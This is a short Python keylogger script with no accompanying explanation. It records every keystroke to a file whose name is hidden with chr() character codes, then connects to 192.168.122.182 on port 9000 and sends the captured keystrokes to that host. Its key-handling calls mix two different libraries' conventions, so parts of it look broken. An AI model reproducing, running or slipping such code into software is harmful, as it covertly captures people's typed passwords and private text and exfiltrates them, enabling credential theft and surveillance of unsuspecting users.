import keyboard
import socket

def on_press(key):
    global keys
    try:
        print(f"Key pressed: {key.char}")
        keys.append(str(key.char))
    except AttributeError:
        print(f"Special key pressed: {str(key)}")
        keys.append(str(key))

def write_file(keys):
    with open(chr(107)+chr(121)+chr(108)+chr(111)+chr(103)+chr(115)+chr(46)+chr(116)+chr(120)+chr(116), "a") as f:
        for k in keys:
            if k == 'Key.space':
                f.write(' ')
            elif k.find('Key') == -1:
                f.write(k)

def on_release(key):
    global keys
    print(f"Key released: {str(key)}")
    write_file(keys)
    keys = []
    if key == keyboard.Key.esc:
        return False

keys = []
keyboard.on_press(on_press)
keyboard.on_release(on_release)
keyboard.wait()

print("Transmitting data to server...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
h = '192.168.122.182'
p = 9000
s.connect((h, p))

with open(chr(107)+chr(121)+chr(108)+chr(111)+chr(103)+chr(115)+chr(46)+chr(116)+chr(120)+chr(116), "rb") as file:
    s.sendall(file.read())

print("Data transmitted.")
s.close()